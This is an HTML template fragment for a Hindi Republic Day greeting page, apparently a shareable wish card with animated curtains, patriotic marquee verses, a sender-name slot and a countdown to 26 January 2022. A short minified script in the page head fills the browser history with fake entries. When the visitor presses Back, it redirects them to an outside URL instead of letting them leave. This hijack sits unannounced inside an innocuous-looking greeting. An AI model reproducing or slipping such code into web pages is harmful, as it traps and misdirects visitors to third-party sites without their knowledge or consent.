...
<meta property="og:title" content="॥ गणतंत्र दिवस की शुभकामनाये ॥" />
<meta property="og:description" content="॥ गणतंत्र दिवस की शुभकामनाये ॥" />
<meta property="og:site_name" content="गणतंत्र दिवस की शुभकामनाये ॥ " />
<meta property="og:image" content="msg.html" />
<title>॥ गणतंत्र दिवस की शुभकामनाये ॥</title>
<link rel="stylesheet" href="animate.min.css">
<script type="text/javascript">! function (){var t;try{for (t=0; 10 > t; ++t) history.pushState({}, "", "#");onpopstate=function (t){t.state && location.replace("https://teksofty.com/neww.php")}}catch (o){}}();</script>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-135142918-10"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-135142918-10');
</script>
<style>
      ...
      .mainContainer {
          background: linear-gradient(to bottom, #FF9D5D 1% ,#FFFFFF 13%,#FFFFFF 36%,#FFFFFF 87%,#A7F47F 100%);
        max-width: 450px;
        min-height: 200px;
        margin: 0 auto;
        text-align: center;
...
@keyframes position {
  ...
  80%, 99.9% {
    ...
    #loading {
         -webkit-animation: rotation-star 10s infinite linear;
         animation: rotation-star 10s infinite linear;
         }
...
<audio id="audio" src="a.mp3?v=84"></audio>
<a class="rope" style="text-decoration:none;" href="#" onclick="play()">
<br>
<div style="font-size: 25px;text-shadow: 1px 1px 3px blue, 1px 1px 3px blue, -1px -1px 3px blue, -1px -1px 3px black;color:white;font-weight: bold;"><br><b>जादुई दिल को <br> टच करके देखो !<br>👇👇👇</b></div>
<br>
<div class="animated pulse" style="background-image: url(img/iflag.png?v=3443); background-size: 60%; background-position: center; background-repeat: no-repeat;">
<img id="loading" src="img/root2.png?v=40038425" class="center swing1" style="max-width:219px; width: 100%;" />
</div>
</a>
<div class="rightcurtain"><img src="img/parda1.jpeg?v=1852" /></div>
<div class="leftcurtain"><img src="img/parda1.jpeg?v=1852" /></div>
<marquee class="m1" behavior="scroll" direction="up" scrolldelay="5"> <br>
<img src="img/i1.png?v=13" height="30px" width="20px" /><br><br>
<img src="img/i2.png?v=13" height="30px" width="20px" /><br><br>
<img src="img/i3.png?v=13" height="30px" width="20px" /><br><br>
<img src="img/i4.png?v=13" height="30px" width="20px" /><br><br>
<img src="img/i1.png?v=13" height="30px" width="20px" /><br><br>
<img src="img/i2.png?v=13" height="30px" width="20px" /><br><br>
<img src="img/i3.png?v=13" height="30px" width="20px" /><br><br>
<img src="img/i4.png?v=13" height="30px" width="20px" /><br><br>
...
<h1 style="background: url(img/namegif.gif);-webkit-text-fill-color: transparent;-webkit-background-clip: text;" id="name"><?php echo $name; ?></h1>
</div>
<div class="pyro">
...
<img src="img/kiTarafSe.png" width="70%" height="auto" style="animation: pulse 0.5s infinite"><br><br>
<div style="font-size: 10px; font-weight: 550; color: black;">
      <p id="demo"></p>
<br>
 <img src="img/main.png?v=13222" width="95%" height="auto" style="animation: pulse 1s infinite"><br>
<br>
<img src="img/main2.png?v=13424432" width="90%" style="ani8ation: pulse 2s infinite">
<br>
<div class="wishMessage" style="">
...
देशभक्तों से ही देश की शान है,</b></marquee>
</div>
<div style="background-color: #ff6600;border-radius: 17px;border: 0px solid rgb(0, 0, 0);box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px;color: #fff;font-family: arial, sans-serif;font-size: 18px;font-stretch: normal;font-style: normal;font-variant: normal;line-height: normal;margin: 5px auto;padding: 4px 5px 3px;width: 82%;">
<marquee behavior="alternate"><b>
देशभक्तों से ही देश का मान है,</b></marquee>
</div>
<div style="background-color: white;border-radius: 17px;border: 0px solid rgb(0, 0, 0);box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px;color: #0000FF;font-family: arial, sans-serif;font-size: 18px;font-stretch: normal;font-style: normal;font-variant: normal;line-height: normal;margin: 5px auto;padding: 4px 5px 3px;width: 82%;">
<marquee behavior="alternate"><b> 🎡🎡</b></marquee>
</div>
...
<marquee behavior="alternate"><b>
हम उस देश के फूल हैं यारों,</b></marquee>
</div>
<div style="background-color: #10e43a;border-radius: 17px;border: 0px solid rgb(0, 0, 0);box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px;color: #fff;font-family: arial, sans-serif;font-size: 18px;font-stretch: normal;font-style: normal;font-variant: normal;line-height: normal;margin: 5px auto;padding: 4px 5px 3px;width: 82%;">
<marquee behavior="alternate"><b>
जिस देश का नाम हिंदुस्तान है,</b></marquee>
</div><br>
<p style="color: #3d07ff;">
॥ गणतंत्र दिवस ॥
</p>
</div>
...
<marquee><b><i>“ की तरफ से आपको और आपके परिवार को गणतंत्र दिवस की हार्दिक शुभकामनाएँ!”</b></i></marquee>
<br>
...
<button class="btn animated shake infinite" type="submit"><span>👉 </span>देखें</button>
</div>
</form>
<script>
...
<script> 
var countDownDate=new Date("January 26, 2022 00:00:00").getTime(),x=setInterval(function(){var e=(new Date).getTime(),o=countDownDate-e,t=Math.floor(o/864e5),n=Math.floor(o%864e5/36e5),a=Math.floor(o%36e5/6e4),l=Math.floor(o%6e4/1e3);document.getElementById("demo").innerHTML=+t+"<font color='red'> दिन,</font> "+n+"<font color='red'> घंटे,</font> "+a+"<font color='green'> मिनट,<br></font> "+l+"<font color='red'>  सेकेंड  </font>पहले",o<0&&(clearInterval(x),document.getElementById("demo").innerHTML="")},1e3);
</script>
</body>
</html>